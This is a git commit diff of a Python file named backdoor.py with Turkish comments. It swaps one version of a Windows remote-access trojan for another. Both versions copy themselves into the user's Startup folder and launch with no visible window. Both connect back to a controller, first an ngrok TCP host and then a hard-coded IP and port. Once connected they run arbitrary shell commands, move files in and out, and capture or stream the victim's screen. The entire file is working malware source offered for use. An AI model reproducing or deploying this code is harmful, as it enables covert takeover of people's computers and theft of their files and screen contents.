02c303befdb022fe8745c03ed8bc56a3790802ee
revolt36 <141328183+revolt36@users.noreply.github.com>
2023-10-10 15:21:41 +0400

    Update backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -1,124 +1,111 @@
 import socket
-import time
 import subprocess
-import json
+import simplejson
 import os
-import pyscreenshot
+import base64
+from vidstream import ScreenShareClient
+import time
+import os
 import shutil
-import subprocess
 import ctypes
 import winreg
 import sys
 
-def reliable_send(data):
-        jsondata = json.dumps(data)
-        s.send(jsondata.encode())
 
-def reliable_recv():
-        data = ''
-        while True:
-                try:
-                        data = data + s.recv(1024).decode().rstrip()
-                        return json.loads(data)
-                except ValueError:
-                        continue
-                        
 def copy_to_startup():
-    try:
-        # Başlangıç klasörünü belirle
-        startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-
-        # Kopyalanacak dosyanın adını ve kaynak yolunu belirle
-        source_filename = 'backdoor.exe'
-        source_path = os.path.abspath(source_filename)
-
-        # Hedef yol oluştur
-        destination = os.path.join(startup_folder, source_filename)
-
-        # Dosyayı başlangıç klasörüne kopyala
-        shutil.copyfile(source_path, destination)
-
-        # Dosyayı çalıştır
-        subprocess.Popen(destination, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
-
-        #print(f"{source_filename} başarıyla başlangıç klasörüne kopyalandı ve çalıştırıldı.")
-
-    except Exception as e:pass
-        # print(f"Hata oluştu: {str(e)}")
-
-
-def screenshot():
-    tamekran_ss = pyscreenshot.grab()
-
-    # Belgeseler klasörünün yolunu elde et
-    documents_path = os.path.expanduser("~/Documents")
-
-    # Dosya adını belirle
-    file_name = "last.png"
-
-    # Tam dosya yolu
-    full_file_path = os.path.join(documents_path, file_name)
-
-    # Ekran görüntüsünü kaydet
-    tamekran_ss.save(full_file_path)
-
-def connection():
-	while True:
-		time.sleep(20)
 		try:
-			s.connect(('2.tcp.eu.ngrok.io',14178))
-			shell()
-			s.close()
-			break
-		except:
-			connection()
+			# Başlangıç klasörünü belirle
+			startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
 
-def upload_file(file_name):
-	f = open(file_name, 'rb')
-	s.send(f.read())
+			# Kopyalanacak dosyanın adını ve kaynak yolunu belirle
+			source_filename = 'backdoor.exe'
+			source_path = os.path.abspath(source_filename)
 
+			# Hedef yol oluştur
+			destination = os.path.join(startup_folder, source_filename)
 
-def download_file(file_name):
-        f = open(file_name, 'wb')
-        s.settimeout(1)
-        chunk = s.recv(1024)
-        while chunk:
-                f.write(chunk)
-                try:
-                        chunk = s.recv(1024)
-                except socket.timeout as e:
-                        break
-        s.settimeout(None)
-        f.close()
+			# Dosyayı başlangıç klasörüne kopyala
+			shutil.copyfile(source_path, destination)
+
+			# Dosyayı çalıştır
+			subprocess.Popen(destination, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
+
+			print(f"{source_filename} başarıyla başlangıç klasörüne kopyalandı ve çalıştırıldı.")
+
+		except Exception as e:
+			print(f"Hata oluştu: {str(e)}")
 
 
-def shell():
-	while True:
-		command = reliable_recv()
-		if command == 'quit':
-			break
-		elif command == 'clear':
-			pass
-		elif command[:3] == 'cd ':
-			os.chdir(command[3:])
-		# elif command == 'cd':
-		# 	komut = subprocess.check_output("cd",shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
-		# 	print(komut)
-		elif command == 'ss':
-			screenshot()
-		elif command[:8] == 'download':
-			upload_file(command[9:])
-		elif command[:6] == 'upload':
-			download_file(command[7:])
-		elif command == False:
-			continue
-		else:
-			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-			result = execute.stdout.read() + execute.stderr.read()
-			result = result.decode()
-			reliable_send(result)
+ip = '192.168.100.133'
+port = 8080
+class MySocket:
+	global ip
+	global port
+
+	def __init__(self, ip, port):
+		try:
+			self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+			self.my_connection.connect((ip,port))
+		except ConnectionResetError or ConnectionRefusedError:
+			time.sleep(5)
+			self.my_connection.connect((ip,port))
+	def command_execution(self, command):
+		return subprocess.check_output(command, shell=True)
+
+	def json_send(self, data):
+		json_data = simplejson.dumps(data)
+		self.my_connection.send(json_data.encode("utf-8"))
+
+	def json_receive(self):
+		json_data = ""
+		while True:
+			try:
+				json_data = json_data + self.my_connection.recv(1024).decode()
+				return simplejson.loads(json_data)
+			except ValueError:
+				continue
+
+	def execute_cd_command(self,directory):
+		os.chdir(directory)
+		return "Cd to " + directory
+
+	def get_file_contents(self,path):
+		with open(path,"rb") as my_file:
+			return base64.b64encode(my_file.read())
 		
+	
+	
+	def screenshare(self):
+		victim = ScreenShareClient(ip, port=9999)
+		victim.start_stream()
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	def save_file(self,path,content):
+		with open(path,"wb") as my_file:
+			my_file.write(base64.b64decode(content))
+			return "Download OK"
+
+	def start_socket(self):
+		while True:
+			command = self.json_receive()
+			try:
+				if command[0] == "quit":
+					self.my_connection.close()
+					exit()
+				elif command[0] == "cd" and len(command) > 1:
+					command_output = self.execute_cd_command(command[1])
+				elif command[0] == "download":
+					command_output = self.get_file_contents(command[1])
+				elif command[0] == "upload":
+					command_output = self.save_file(command[1],command[2])
+				elif command[0] == 'screen':
+					self.screenshare()
+				else:
+					command_output = self.command_execution(command)
+			except Exception:
+				command_output = "Error!"
+			self.json_send(command_output)
+		self.my_connection.close()
+
 copy_to_startup()
-connection()
+my_socket_object = MySocket(ip,port)
+my_socket_object.start_socket()
